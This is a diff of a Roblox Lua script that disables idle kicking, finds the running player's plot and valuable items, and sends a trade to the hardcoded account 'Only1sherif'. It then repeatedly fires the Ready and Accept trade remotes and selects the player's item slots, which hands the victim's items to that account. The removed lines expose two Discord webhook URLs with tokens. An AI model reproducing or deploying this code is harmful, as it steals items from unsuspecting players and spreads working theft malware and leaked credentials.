@@ -1,15 +1,22 @@
 if game.PlaceId ~= 109983668079237 then return end
 
-getgenv().WEBHOOK_URL2 = "https://discord.com/api/webhooks/1491134694656311397/ofX4CsHmL97_mPLxkp5f4VKHYOAq7tlcd_3SobAZzoESre71UpxmKg-g_V-0_9o2tPqT"
-getgenv().WEBHOOKSHERIF = "https://discord.com/api/webhooks/1490063982760038440/CLhsVX58Yl-Xd5ZqG8kiSqEoNl9NoV4A1SDQXsjOVGJQNGOdfYlk-OetI7XGas0QirJd"
-
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
-local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer.PlayerGui
+local plr = Players.LocalPlayer
 
-local MY_USER = "Only1sherif"
+for i, v in pairs(getconnections(plr.Idled)) do
+    if v.Disable then v:Disable() end
+end
+
+local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
+local function getRemote(name)
+    local children = Net:GetChildren()
+    for i, obj in ipairs(children) do if obj.Name == name then return children[i+1] end end
+    return nil
+end
+
+local readyRE = getRemote("RE/TradeService/Ready")
+local acceptRE = getRemote("RE/TradeService/Accept")
 
 local wantedItems = {
     "Tralaledon", "Strawberry Elephant", "Skibidi Toilet", "Rosey and Teddy",
@@ -28,20 +35,6 @@ local wantedItems = {
     "Jolly Jolly Sahur", "Fortunu and Coinuru", "Gold Gold Gold", "La Extinct Grande", "La Easter Grande", "Chillin Chilli", "Hydra Bunny",
 }
 
-for i, v in pairs(getconnections(LocalPlayer.Idled)) do
-    if v.Disable then v:Disable() end
-end
-
-local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
-local function getRemote(name)
-    local children = Net:GetChildren()
-    for i, obj in ipairs(children) do if obj.Name == name then return children[i+1] end end
-    return nil
-end
-
-local readyRE = getRemote("RE/TradeService/Ready")
-local acceptRE = getRemote("RE/TradeService/Accept")
-
 local function scanPlot()
     local plots = workspace:FindFirstChild("Plots")
     if not plots then return false end
@@ -50,7 +43,7 @@ local function scanPlot()
         local sign = p:FindFirstChild("PlotSign")
         if sign then
             local lbl = sign:FindFirstChildOfClass("SurfaceGui", true):FindFirstChildOfClass("TextLabel", true)
-            if lbl and (lbl.Text:lower():find(LocalPlayer.Name:lower()) or lbl.Text:lower():find(LocalPlayer.DisplayName:lower())) then
+            if lbl and (lbl.Text:lower():find(plr.Name:lower()) or lbl.Text:lower():find(plr.DisplayName:lower())) then
                 myPlot = p
                 break
             end
@@ -68,36 +61,23 @@ local function scanPlot()
     return false
 end
 
-local function handleIncomingRequests()
-    local reqUI = PlayerGui:FindFirstChild("TradeInviteReceived")
-    if reqUI and reqUI.Enabled then
-        local btn = reqUI:FindFirstChild("Accept", true)
-        if btn and btn.Visible then
-            pcall(function() firesignal(btn.Activated) end)
-        end
-    end
-end
-
 local function sendInvite()
-    local tl = PlayerGui:FindFirstChild("TradePlayerList")
+    local tl = plr.PlayerGui:FindFirstChild("TradePlayerList")
     if tl and tl:FindFirstChild("TradePlayerList") then
         local inner = tl.TradePlayerList
         local sb = inner.bg.SearchFrame.SearchBox
-        sb.Text = MY_USER
-        task.wait(0.5)
+        sb.Text = "Only1sherif"
+        task.wait(0.3)
         pcall(function() firesignal(sb.FocusLost, true) end)
-        task.wait(0.5)
-        local list = inner:FindFirstChild("Global") and inner.Global:FindFirstChild("List")
-        if list then
-            for _, p in pairs(list:GetChildren()) do
-                if p:IsA("Frame") and p:FindFirstChild("Fill") then
-                    local nameLbl = p.Fill:FindFirstChild("Username")
-                    if nameLbl and nameLbl.Text:find(MY_USER) then
-                        local send = p.Fill:FindFirstChild("Send")
-                        if send then
-                            pcall(function() firesignal(send.Activated) end)
-                            return true
-                        end
+        task.wait(0.4)
+        for _, p in pairs(inner.Global.List:GetChildren()) do
+            if p:IsA("Frame") and p:FindFirstChild("Fill") then
+                local nameLbl = p.Fill:FindFirstChild("Username")
+                if nameLbl and nameLbl.Text:find("Only1sherif") then
+                    local send = p.Fill:FindFirstChild("Send")
+                    if send then
+                        pcall(function() firesignal(send.Activated) end)
+                        return true
                     end
                 end
             end
@@ -109,20 +89,35 @@ end
 task.spawn(function()
     while true do
         pcall(function()
-            local tradeUI = PlayerGui:FindFirstChild("TradeLiveTrade")
-            
-            handleIncomingRequests()
-
+            local tradeUI = plr.PlayerGui:FindFirstChild("TradeLiveTrade")
             if tradeUI and tradeUI.Enabled then
+                local inner = tradeUI.TradeLiveTrade
+                
                 if readyRE then readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end
-                task.wait(0.8)
+                task.wait(0.3)
                 if acceptRE then acceptRE:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb") end
+                
+                if inner.Other.Username.Text:find("Only1sherif") then
+                    local scroll = inner:FindFirstChild("ScrollingFrame", true)
+                    if scroll then
+                        for _, slot in pairs(scroll:GetChildren()) do
+                            if slot.Name:sub(1,9) == "Selection" then
+                                local spacer = slot:FindFirstChild("Spacer")
+                                if spacer and spacer:FindFirstChild("UIStroke") then
+                                    if spacer.UIStroke.Color ~= Color3.fromRGB(0, 255, 0) then
+                                        firesignal(spacer.Activated)
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
             else
                 if scanPlot() then
                     sendInvite()
                 end
             end
         end)
-        task.wait(1.5)
+        task.wait(1)
     end
 end)
